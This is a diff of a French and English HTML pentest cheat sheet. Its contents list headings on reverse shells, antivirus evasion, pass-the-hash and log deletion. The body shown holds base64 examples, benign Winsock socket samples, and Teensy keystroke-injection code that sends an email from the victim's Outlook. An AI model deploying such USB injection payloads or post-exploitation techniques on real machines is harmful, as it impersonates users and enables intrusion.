@@ -4,11 +4,14 @@
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <meta http-equiv="Content-Style-Type" content="text/css" />
   <meta name="generator" content="pandoc" />
-  <title></title>
+  <meta name="author" content="Poulpy, Plopi42" />
+  <meta name="date" content="2014-02-06" />
+  <title>Technical cheat sheets</title>
+  <style type="text/css">code{white-space: pre;}</style>
   <style type="text/css">
 table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
   margin: 0; padding: 0; vertical-align: baseline; border: none; }
-table.sourceCode { width: 100%; background-color: #f8f8f8; }
+table.sourceCode { width: 100%; line-height: 100%; background-color: #f8f8f8; }
 td.lineNumbers { text-align: right; padding-right: 4px; padding-left: 4px; color: #aaaaaa; border-right: 1px solid #aaaaaa; }
 td.sourceCode { padding-left: 5px; }
 pre, code { background-color: #f8f8f8; }
@@ -25,1033 +28,755 @@ code > span.al { color: #ef2929; }
 code > span.fu { color: #000000; }
 code > span.er { font-weight: bold; }
   </style>
-  <link rel="stylesheet" href="extra/pandoc.css" type="text/css" />
+  <link rel="stylesheet" href="extra/buttondown.css" type="text/css" />
 </head>
 <body>
+<div id="header">
+<h1 class="title">Technical cheat sheets</h1>
+<h2 class="author">Poulpy, Plopi42</h2>
+<h3 class="date">2014-02-06</h3>
+</div>
 <div id="TOC">
 <ul>
+<li><a href="#cryptographie-et-encodage">Cryptographie et Encodage</a><ul>
+<li><a href="#ascii">ASCII</a><ul>
+<li><a href="#table-ascii">Table ASCII</a></li>
+</ul></li>
+<li><a href="#base-64">Base 64</a><ul>
+<li><a href="#description">Description</a></li>
+<li><a href="#tables-de-conversion">Tables de conversion</a></li>
+<li><a href="#exemples">Exemples</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#development">Development</a><ul>
+<li><a href="#teensy">Teensy</a><ul>
+<li><a href="#envoie-de-mail-via-outlook-2007">Envoie de mail via outlook 2007</a></li>
+</ul></li>
+<li><a href="#windows">Windows</a><ul>
+<li><a href="#socket-windows-en-c-c">Socket Windows en C / C++</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#github">GitHub</a><ul>
+<li><a href="#github-repositories">GitHub repositories</a><ul>
+<li><a href="#useful-powershell-scripts">Useful PowerShell scripts</a></li>
+<li><a href="#post-exploitation-collection">Post Exploitation Collection</a></li>
+<li><a href="#white-chapel-password-auditing-framework">White Chapel Password Auditing Framework</a></li>
+<li><a href="#collection-of-multiple-types-of-lists">Collection of multiple types of lists</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#os">OS</a><ul>
+<li><a href="#linux">Linux</a><ul>
+<li><a href="#liste-de-paquets-utiles-debian">Liste de paquets utiles (debian)</a></li>
+</ul></li>
 <li><a href="#post-exploitation-command-list">Post-Exploitation Command List</a><ul>
+<li><a href="#github-repository-full-of-post-exploit-stuff">GitHub repository full of post exploit stuff</a></li>
 <li><a href="#linux-unix-bsd">Linux Unix BSD</a></li>
 <li><a href="#metasploit">Metasploit</a></li>
 <li><a href="#obscuresystemsaixembedded">ObscureSystemsAIXEmbedded</a></li>
 <li><a href="#osx">OSX</a></li>
-<li><a href="#windows">Windows</a></li>
+<li><a href="#windows-1">Windows</a></li>
 </ul></li>
-<li><a href="#commandes-windows">Commandes Windows</a><ul>
-<li><a href="#propriétés">Propriétés</a></li>
-<li><a href="#programmes-et-outils-windows">Programmes et outils Windows</a></li>
-<li><a href="#gestion-des-disques">Gestion des disques</a></li>
-<li><a href="#gestion-des-réseaux-et-internet">Gestion des réseaux et Internet</a></li>
-<li><a href="#autres-commandes">Autres commandes</a></li>
-<li><a href="#gestion-des-utilisateurs">Gestion des utilisateurs</a><ul>
-<li><a href="#activation-dun-utilisateur">activation d’un utilisateur</a></li>
-<li><a href="#désactivation-dun-utilisateur">désactivation d’un utilisateur</a></li>
+<li><a href="#windows-2">Windows</a><ul>
+<li><a href="#commandes-windows">Commandes Windows</a></li>
 </ul></li>
-<li><a href="#gestion-des-services">Gestion des services</a></li>
-<li><a href="#gestion-des-fichiers">Gestion des fichiers</a></li>
 </ul></li>
-<li><a href="#windows-pentest-commands">Windows pentest commands</a><ul>
-<li><a href="#blind-files">Blind Files</a></li>
-<li><a href="#system">System</a></li>
-<li><a href="#networking-ipconfig-netstat-net">Networking (ipconfig, netstat, net)</a></li>
-<li><a href="#configs">Configs</a></li>
-<li><a href="#finding-important-files">FINDING IMPORTANT FILES</a></li>
-<li><a href="#files-to-pull-if-possible">FILES TO PULL (IF POSSIBLE)</a></li>
-<li><a href="#remote-system-access">REMOTE SYSTEM ACCESS</a></li>
-<li><a href="#auto-start-directories">AUTO-START DIRECTORIES</a></li>
-<li><a href="#wmi">WMI</a></li>
-<li><a href="#reg-command">REG COMMAND</a></li>
-<li><a href="#deleting-logs">DELETING LOGS</a></li>
-<li><a href="#uninstalling-software-antivirus-non-interactive">UNINSTALLING SOFTWARE “ANTIVIRUS” (NON INTERACTIVE)</a></li>
-<li><a href="#other-to-be-sorted">OTHER (TO BE SORTED)</a></li>
-<li><a href="#os-specific">OS SPECIFIC</a></li>
-<li><a href="#invasive-or-altering-commands">INVASIVE OR ALTERING COMMANDS</a></li>
-</ul></li>
-<li><a href="#tests">TESTS</a><ul>
-<li><a href="#toto">TOTO</a></li>
-</ul></li>
+<li><a href="#tools">Tools</a><ul>
 <li><a href="#metasploit-1">Metasploit</a><ul>
-<li><a href="#genration-de-payload-executables">Genration de payload executables</a><ul>
-<li><a href="#manuel">Manuel</a></li>
-<li><a href="#exemple">Exemple</a><ul>
-<li><a href="#lister-les-options-dun-payload">Lister les options d’un payload</a></li>
-<li><a href="#créer-un-payload-meterpreter-pour-windows">Créer un payload meterpreter pour windows</a></li>
-</ul></li>
-<li><a href="#alternative">Alternative</a></li>
-</ul></li>
+<li><a href="#generation-de-payload-executables">Generation de payload executables</a></li>
 <li><a href="#lancement-de-handler">Lancement de handler</a></li>
 </ul></li>
-<li><a href="#ssh">SSH</a><ul>
-<li><a href="#copy-ssh-keys-to-userhost-to-enable-password-less-ssh-logins">copy ssh keys to user@host to enable password-less ssh logins</a></li>
-<li><a href="#start-a-tunnel-from-some-machines-port-80-to-your-local-post-2001">start a tunnel from some machine’s port 80 to your local post 2001</a></li>
-<li><a href="#output-your-microphone-to-a-remote-computers-speaker">output your microphone to a remote computer’s speaker</a></li>
-<li><a href="#compare-a-remote-file-with-a-local-file">compare a remote file with a local file</a></li>
-<li><a href="#mount-folderfilesystem-through-ssh">mount folder/filesystem through ssh</a></li>
-<li><a href="#ssh-connection-through-host-in-the-middle">ssh connection through host in the middle</a></li>
-<li><a href="#copy-from-host1-to-host2-through-your-host">copy from host1 to host2, through your host</a></li>
-<li><a href="#run-any-gui-program-remotely">run any gui program remotely</a></li>
-<li><a href="#create-a-persistent-connection-to-a-machine">create a persistent connection to a machine</a></li>
-<li><a href="#attach-screen-over-ssh">attach screen over ssh</a></li>
-<li><a href="#port-knocking">port knocking!</a></li>
-<li><a href="#remove-a-line-in-a-text-file.-useful-to-fix">remove a line in a text file. useful to fix</a></li>
-<li><a href="#run-complex-remote-shell-cmds-over-ssh-without-escaping-quotes">run complex remote shell cmds over ssh, without escaping quotes</a></li>
-<li><a href="#copy-a-mysql-database-to-a-new-server-via-ssh-with-one-command">copy a mysql database to a new server via ssh with one command</a></li>
-<li><a href="#remove-a-line-in-a-text-file.-useful-to-fix-ssh-host-key-change-warnings">remove a line in a text file. useful to fix “ssh host key change” warnings</a></li>
-<li><a href="#copy-your-ssh-public-key-to-a-server-from-a-machine-that-doesnt-have-ssh-copy-id">copy your ssh public key to a server from a machine that doesn’t have ssh-copy-id</a></li>
-<li><a href="#live-ssh-network-throughput-test">live ssh network throughput test</a></li>
-<li><a href="#how-to-establish-a-remote-gnu-screen-session-that-you-can-re-connect-to">how to establish a remote gnu screen session that you can re-connect to</a></li>
-<li><a href="#resume-scp-of-a-big-file">resume scp of a big file</a></li>
-<li><a href="#analyze-traffic-remotely-over-ssh-w-wireshark">analyze traffic remotely over ssh w/ wireshark</a></li>
-<li><a href="#have-an-ssh-session-open-forever">have an ssh session open forever</a></li>
-<li><a href="#harder-faster-stronger-ssh-clients">harder, faster, stronger ssh clients</a></li>
-<li><a href="#throttle-bandwidth-with-cstream">throttle bandwidth with cstream</a></li>
-<li><a href="#transfer-ssh-public-key-to-another-machine-in-one-step">transfer ssh public key to another machine in one step</a></li>
-<li><a href="#copy-stdin-to-your-x11-buffer">copy stdin to your x11 buffer</a></li>
-<li><a href="#create-an-encrypted-tunnel-over-ssh-for-your-synergy-client-to-use">Create an encrypted tunnel over ssh for your synergy client to use</a></li>
-</ul></li>
 <li><a href="#vlc">VLC</a><ul>
-<li><a href="#transcoding">Transcoding</a><ul>
-<li><a href="#vers-mp4">vers MP4</a></li>
-<li><a href="#vers-avi">vers AVI</a></li>
-</ul></li>
+<li><a href="#transcoding">Transcoding</a></li>
 <li><a href="#options-utiles">Options utiles</a></li>
 <li><a href="#net-casting-http">Net casting http</a></li>
 <li><a href="#devices">Devices</a></li>
 </ul></li>
+</ul></li>
+<li><a href="#internet">Internet</a><ul>
+<li><a href="#cheatsheet">CheatSheet</a><ul>
+<li><a href="#sqli">SQLi</a></li>
+<li><a href="#html">HTML</a></li>
+<li><a href="#multiples-categories">Multiples categories</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#linux-1">Linux</a><ul>
+<li><a href="#linux-tricks">Linux tricks</a><ul>
+<li><a href="#affichage-de-ladresse-ip">Affichage de l’adresse IP</a></li>
+<li><a href="#bash-tricks">Bash tricks</a></li>
+</ul></li>
+<li><a href="#commandes-linux-post-exploitation">Commandes Linux post exploitation</a><ul>
+<li><a href="#création-dun-bindshell">Création d’un bindshell</a></li>
+<li><a href="#création-dun-reverse-bindshell">Création d’un reverse bindshell</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#tools-1">Tools</a><ul>
+<li><a href="#git">GIT</a><ul>
+<li><a href="#ressources">Ressources</a></li>
+<li><a href="#useful-commands">Useful commands</a></li>
+</ul></li>
+<li><a href="#grub">GRUB</a><ul>
+<li><a href="#configuration---modification-de-la-taille-du-terminal">Configuration - Modification de la taille du terminal</a></li>
+<li><a href="#affichage-du-fichier-shadow">Affichage du fichier shadow</a></li>
+<li><a href="#récupération-dun-shell-root">Récupération d’un shell root</a></li>
+</ul></li>
+<li><a href="#image-magick">Image Magick</a><ul>
+<li><a href="#créer-une-image">Créer une image</a></li>
+<li><a href="#write-text-on-an-image">Write text on an image</a></li>
+</ul></li>
+<li><a href="#john-the-ripper">John the ripper</a><ul>
+<li><a href="#hash-lm-vers-hash-ntlm">Hash LM vers Hash NTLM</a></li>
+</ul></li>
+<li><a href="#metasploit-2">Metasploit</a><ul>
+<li><a href="#genération-de-payload-exécutables">Genération de payload exécutables</a></li>
+<li><a href="#lancement-de-handler-1">Lancement de handler</a></li>
+<li><a href="#exploitation-depuis-msfconsole">Exploitation depuis msfconsole</a></li>
+<li><a href="#contournement-des-antivirus">Contournement des antivirus</a></li>
+<li><a href="#passthehash-en-utilisant-metasploit">PassTheHash en utilisant metasploit</a></li>
+<li><a href="#récupération-de-mots-de-passe">Récupération de mots de passe</a></li>
+</ul></li>
+<li><a href="#vlc-1">VLC</a><ul>
+<li><a href="#transcoding-1">Transcoding</a></li>
+<li><a href="#options-utiles-1">Options utiles</a></li>
+<li><a href="#net-casting-http-1">Net casting http</a></li>
+<li><a href="#devices-1">Devices</a></li>
+</ul></li>
+<li><a href="#vmware">VMWare</a><ul>
+<li><a href="#installer-une-vm-debian-7-avec-les-vmware-tools">Installer une VM debian 7 avec les VMWare tools</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#windows-3">Windows</a><ul>
+<li><a href="#configuration-de-windows-en-ligne-de-commande">Configuration de windows en ligne de commande</a><ul>
+<li><a href="#configuration-de-internet-explorer-en-ligne-de-commande">Configuration de Internet Explorer en ligne de commande</a></li>
+<li><a href="#configuration-de-la-carte-réseau-en-ligne-de-commande">Configuration de la carte réseau en ligne de commande</a></li>
+</ul></li>
+<li><a href="#ligne-de-commande-windows">Ligne de commande Windows</a><ul>
+<li><a href="#gestion-des-utilisateurs-1">Gestion des utilisateurs</a></li>
+<li><a href="#gestion-des-services-1">Gestion des services</a></li>
+<li><a href="#gestion-des-fichiers-1">Gestion des fichiers</a></li>
+<li><a href="#commandes-utiles">Commandes utiles</a></li>
+<li><a href="#téléchargement-dun-fichier">Téléchargement d’un fichier</a></li>
+<li><a href="#récupération-de-la-clé-de-license">Récupération de la clé de license</a></li>
+</ul></li>
+</ul></li>
 </ul>
 </div>
-<h1 id="post-exploitation-command-list"><a href="#TOC">Post-Exploitation Command List</a></h1>
-<h2 id="linux-unix-bsd"><a href="#TOC">Linux Unix BSD</a></h2>
-<p><a href="../ressources/Post-ExploitationCommandList/LinuxUnixBSD/LinuxUnixBSDPostExploitationCommandList.html">Linux Unix BSD</a></p>
-<h2 id="metasploit"><a href="#TOC">Metasploit</a></h2>
-<p><a href="../ressources/Post-ExploitationCommandList/Metasploit/MetasploitPostExploitationCommandList.html">Metasploit</a></p>
-<h2 id="obscuresystemsaixembedded"><a href="#TOC">ObscureSystemsAIXEmbedded</a></h2>
-<p><a href="../ressources/Post-ExploitationCommandList/ObscureSystemsAIXEmbedded/ObscureSystems_AIXEmbededetc_PostExploitComma.html">ObscureSystemsAIXEmbedded</a></p>
-<h2 id="osx"><a href="#TOC">OSX</a></h2>
-<p><a href="../ressources/Post-ExploitationCommandList/OSX/OSXPostExploitation.html">OSX</a></p>
-<h2 id="windows"><a href="#TOC">Windows</a></h2>
-<p><a href="../ressources/Post-ExploitationCommandList/Windows/WindowsPostExploitationCommandList.html">Windows</a></p>
-<h1 id="commandes-windows"><a href="#TOC">Commandes Windows</a></h1>
-<h2 id="propriétés"><a href="#TOC">Propriétés</a></h2>
+<h1 id="cryptographie-et-encodage"><a href="#cryptographie-et-encodage">Cryptographie et Encodage</a></h1>
+<h2 id="ascii"><a href="#ascii">ASCII</a></h2>
+<h3 id="table-ascii"><a href="#table-ascii">Table ASCII</a></h3>
+<div class="figure">
+<img src="../ressources/Cryptographie_et_Encodage/Ascii/Ascii.png" alt="Table ASCII" /><p class="caption">Table ASCII</p>
+</div>
+<h2 id="base-64"><a href="#base-64">Base 64</a></h2>
+<h3 id="description"><a href="#description">Description</a></h3>
+<p>La base 64 est un encodage de données utilisant 64 caractères standards et un caractère de complément ‘=’ utilisé comme bourage. Il est utilisé dans les messages électroniques (SMTP, POP, IMAP …) et dans les pages WEB. Il permet la transmission de tout type de données (images, vidéos, doc …) en mode texte. Il est défini en tant que codage MIME.</p>
+<p>Le résultat est plus important que la taille d’origine : 3octets = 4octets encodés.</p>
+<h3 id="tables-de-conversion"><a href="#tables-de-conversion">Tables de conversion</a></h3>
+<h4 id="table-de-conversion-base-64-standard"><a href="#table-de-conversion-base-64-standard">Table de conversion base 64 standard</a></h4>
+<div class="figure">
+<img src="../ressources/Cryptographie_et_Encodage/Base64/Base64-regular.png" title="Table de conversion base 64 standard" alt="Table de conversion base 64 standard" /><p class="caption">Table de conversion base 64 standard</p>
+</div>
+<h4 id="table-de-conversion-base-64-pour-les-url"><a href="#table-de-conversion-base-64-pour-les-url">Table de conversion base 64 pour les URL</a></h4>
+<div class="figure">
+<img src="../ressources/Cryptographie_et_Encodage/Base64/Base64-url.png" title="Table de conversion base 64 pour les URL" alt="Table de conversion base 64 pour les URL" /><p class="caption">Table de conversion base 64 pour les URL</p>
+</div>
+<h3 id="exemples"><a href="#exemples">Exemples</a></h3>
+<h4 id="exemple-détaillé"><a href="#exemple-détaillé">Exemple détaillé</a></h4>
+<div class="figure">
+<img src="../ressources/Cryptographie_et_Encodage/Base64/Base64-exemple.png" title="Exemple détaillé" alt="Exemple détaillé" /><p class="caption">Exemple détaillé</p>
+</div>
+<h4 id="autres-exemples"><a href="#autres-exemples">Autres exemples</a></h4>
+<pre><code>$ echo -n &#39;A&#39; | base64
+QQ==</code></pre>
+<pre><code>$ echo -n &#39;AB&#39; | base64
+QUI=</code></pre>
+<pre><code>$ echo -n &#39;ABC&#39; | base64
+QUJD</code></pre>
+<pre><code>$ echo -n &#39;ABCA&#39; | base64
+QUJDQQ==</code></pre>
+<h1 id="development"><a href="#development">Development</a></h1>
+<h2 id="teensy"><a href="#teensy">Teensy</a></h2>
+<h3 id="envoie-de-mail-via-outlook-2007"><a href="#envoie-de-mail-via-outlook-2007">Envoie de mail via outlook 2007</a></h3>
+<pre class="sourceCode C"><code class="sourceCode c"><span class="dt">const</span> <span class="dt">int</span> ledPin = <span class="dv">13</span>;
+<span class="dt">int</span> doit = <span class="dv">0</span>;
+
+<span class="dt">void</span> pressKeyWithModifier(<span class="dt">uint8_t</span> modifier, <span class="dt">uint8_t</span> key)
+{
+  Keyboard.set_modifier(modifier);
+  Keyboard.set_key1(key);
+  Keyboard.send_now();
+  delay(<span class="dv">45</span>);
+
+  Keyboard.set_modifier(<span class="dv">0</span>);
+  Keyboard.set_key1(<span class="dv">0</span>);
+  Keyboard.send_now();
+  delay(<span class="dv">45</span>);
+}
+
+<span class="dt">void</span> launchCmd(<span class="dt">const</span> <span class="dt">char</span>* cmd)
+{
+  pressKeyWithModifier(MODIFIERKEY_GUI, KEY_R);
+  Keyboard.println(cmd);
+}
+
+<span class="dt">void</span> waitAndBlink(<span class="dt">int</span> waitTime, <span class="dt">int</span> blinkDelay)
+{
+  delay(waitTime);
+  digitalWrite(ledPin, LOW);
+  delay(blinkDelay);
+  digitalWrite(ledPin, HIGH);
+}
+
+<span class="dt">void</span> setup()
+{
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+
+  doit = <span class="dv">0</span>;
+}
+
+<span class="dt">void</span> writeMail(<span class="dt">const</span> <span class="dt">char</span>* to, <span class="dt">const</span> <span class="dt">char</span>* subject, <span class="dt">const</span> <span class="dt">char</span>* content, <span class="dt">const</span> <span class="dt">char</span>* sign)
+{
+  waitAndBlink(<span class="dv">200</span>, <span class="dv">200</span>);
+
+  pressKeyWithModifier(MODIFIERKEY_GUI, KEY_R);
+  waitAndBlink(<span class="dv">200</span>, <span class="dv">200</span>);
+  Keyboard.print(<span class="st">&quot;mailto:&quot;</span>);
+  Keyboard.print(to);
+  Keyboard.print(<span class="st">&quot;?subject=&quot;</span>);
+  Keyboard.print(subject);
+  Keyboard.print(<span class="st">&quot;&amp;body=&quot;</span>);
+  Keyboard.print(content);
+  Keyboard.print(<span class="st">&quot;%0A%0A--%20%0A&quot;</span>);
+  Keyboard.print(sign);
+  Keyboard.println(<span class="st">&quot;&quot;</span>);
+
+  waitAndBlink(<span class="dv">1000</span>, <span class="dv">200</span>);
+  <span class="co">//Send</span>
+  pressKeyWithModifier(MODIFIERKEY_ALT, KEY_V);
+  waitAndBlink(<span class="dv">200</span>, <span class="dv">200</span>);
+}
+
+<span class="dt">void</span> loop()
+{
+  <span class="dt">char</span> *to;
+  delay(<span class="dv">1900</span>);
+
+  <span class="kw">if</span> (!doit)
+  {
+    to = <span class="st">&quot;tata@yopmail.com&quot;</span>;
+  }
+  <span class="kw">else</span>
+  {
+    to = <span class="st">&quot;toto@yopmail.com&quot;</span>;
+  }
+
+  writeMail(to, <span class="st">&quot;Croissants mardi&quot;</span>,
+                <span class="st">&quot;Bonjour,%0A%0AJ&#39;offre%20à%20toute%20l&#39;équipe%20des%20croissants%20et%20des%20pains%20au%20chocolat%20mardi%20matin.&quot;</span>,
+                <span class="st">&quot;Teensy%20by%20Me&quot;</span>);
+
+  digitalWrite(ledPin, HIGH);
+  delay(<span class="dv">500</span>);
+  digitalWrite(ledPin, LOW);
+  delay(<span class="dv">20000</span>);
+
+}</code></pre>
+<h2 id="windows"><a href="#windows">Windows</a></h2>
+<h3 id="socket-windows-en-c-c"><a href="#socket-windows-en-c-c">Socket Windows en C / C++</a></h3>
+<h4 id="client"><a href="#client">Client</a></h4>
+<pre class="sourceCode C"><code class="sourceCode c"><span class="ot">#define WIN32_LEAN_AND_MEAN</span>
+
+<span class="ot">#include &lt;windows.h&gt;</span>
+<span class="ot">#include &lt;winsock2.h&gt;</span>
+<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
+<span class="ot">#include &lt;stdlib.h&gt;</span>
+<span class="ot">#include &lt;stdio.h&gt;</span>
+
+
+<span class="co">// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib</span>
+<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
+<span class="ot">#pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
+<span class="ot">#pragma comment (lib, &quot;AdvApi32.lib&quot;)</span>
+
+
+<span class="ot">#define DEFAULT_BUFLEN 512</span>
+<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
+
+<span class="dt">int</span> __cdecl main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv) 
+{
+    WSADATA wsaData;
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    <span class="kw">struct</span> addrinfo *result = NULL,
+                    *ptr = NULL,
+                    hints;
+    <span class="dt">char</span> *sendbuf = <span class="st">&quot;this is a test&quot;</span>;
+    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
+    <span class="dt">int</span> iResult;
+    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
+    
+    <span class="co">// Validate the parameters</span>
+    <span class="kw">if</span> (argc != <span class="dv">2</span>) {
+        printf(<span class="st">&quot;usage: %s server-name</span><span class="ch">\n</span><span class="st">&quot;</span>, argv[<span class="dv">0</span>]);
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Initialize Winsock</span>
+    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
+    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
+        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    ZeroMemory( &amp;hints, <span class="kw">sizeof</span>(hints) );
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    <span class="co">// Resolve the server address and port</span>
+    iResult = getaddrinfo(argv[<span class="dv">1</span>], DEFAULT_PORT, &amp;hints, &amp;result);
+    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
+        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Attempt to connect to an address until one succeeds</span>
+    <span class="kw">for</span>(ptr=result; ptr != NULL ;ptr=ptr-&gt;ai_next) {
+
+        <span class="co">// Create a SOCKET for connecting to server</span>
+        ConnectSocket = socket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, 
+            ptr-&gt;ai_protocol);
+        <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
+            printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+            WSACleanup();
+            <span class="kw">return</span> <span class="dv">1</span>;
+        }
+
+        <span class="co">// Connect to server.</span>
+        iResult = connect( ConnectSocket, ptr-&gt;ai_addr, (<span class="dt">int</span>)ptr-&gt;ai_addrlen);
+        <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            ConnectSocket = INVALID_SOCKET;
+            <span class="kw">continue</span>;
+        }
+        <span class="kw">break</span>;
+    }
+
+    freeaddrinfo(result);
+
+    <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
+        printf(<span class="st">&quot;Unable to connect to server!</span><span class="ch">\n</span><span class="st">&quot;</span>);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Send an initial buffer</span>
+    iResult = send( ConnectSocket, sendbuf, (<span class="dt">int</span>)strlen(sendbuf), <span class="dv">0</span> );
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ConnectSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    printf(<span class="st">&quot;Bytes Sent: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+
+    <span class="co">// shutdown the connection since no more data will be sent</span>
+    iResult = shutdown(ConnectSocket, SD_SEND);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ConnectSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Receive until the peer closes the connection</span>
+    <span class="kw">do</span> {
+
+        iResult = recv(ConnectSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
+        <span class="kw">if</span> ( iResult &gt; <span class="dv">0</span> )
+            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        <span class="kw">else</span> <span class="kw">if</span> ( iResult == <span class="dv">0</span> )
+            printf(<span class="st">&quot;Connection closed</span><span class="ch">\n</span><span class="st">&quot;</span>);
+        <span class="kw">else</span>
+            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+
+    } <span class="kw">while</span>( iResult &gt; <span class="dv">0</span> );
+
+    <span class="co">// cleanup</span>
+    closesocket(ConnectSocket);
+    WSACleanup();
+
+    <span class="kw">return</span> <span class="dv">0</span>;
+}</code></pre>
+<h4 id="serveur"><a href="#serveur">Serveur</a></h4>
+<pre class="sourceCode C"><code class="sourceCode c">
+<span class="ot">#define WIN32_LEAN_AND_MEAN</span>
+
+<span class="ot">#undef UNICODE</span>
+
+
+<span class="ot">#include &lt;windows.h&gt;</span>
+<span class="ot">#include &lt;winsock2.h&gt;</span>
+<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
+<span class="ot">#include &lt;stdlib.h&gt;</span>
+<span class="ot">#include &lt;stdio.h&gt;</span>
+
+<span class="co">// Need to link with Ws2_32.lib</span>
+<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
+<span class="co">// #pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
+
+<span class="ot">#define DEFAULT_BUFLEN 512</span>
+<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
+
+<span class="dt">int</span> __cdecl main(<span class="dt">void</span>) 
+{
+    WSADATA wsaData;
+    <span class="dt">int</span> iResult;
+
+    SOCKET ListenSocket = INVALID_SOCKET;
+    SOCKET ClientSocket = INVALID_SOCKET;
+
+    <span class="kw">struct</span> addrinfo *result = NULL;
+    <span class="kw">struct</span> addrinfo hints;
+
+    <span class="dt">int</span> iSendResult;
+    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
+    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
+    
+    <span class="co">// Initialize Winsock</span>
+    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
+    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
+        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    ZeroMemory(&amp;hints, <span class="kw">sizeof</span>(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    hints.ai_flags = AI_PASSIVE;
+
+    <span class="co">// Resolve the server address and port</span>
+    iResult = getaddrinfo(NULL, DEFAULT_PORT, &amp;hints, &amp;result);
+    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
+        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Create a SOCKET for connecting to server</span>
+    ListenSocket = socket(result-&gt;ai_family, result-&gt;ai_socktype, result-&gt;ai_protocol);
+    <span class="kw">if</span> (ListenSocket == INVALID_SOCKET) {
+        printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        freeaddrinfo(result);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Setup the TCP listening socket</span>
+    iResult = bind( ListenSocket, result-&gt;ai_addr, (<span class="dt">int</span>)result-&gt;ai_addrlen);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;bind failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        freeaddrinfo(result);
+        closesocket(ListenSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    freeaddrinfo(result);
+
+    iResult = listen(ListenSocket, SOMAXCONN);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;listen failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ListenSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Accept a client socket</span>
+    ClientSocket = accept(ListenSocket, NULL, NULL);
+    <span class="kw">if</span> (ClientSocket == INVALID_SOCKET) {
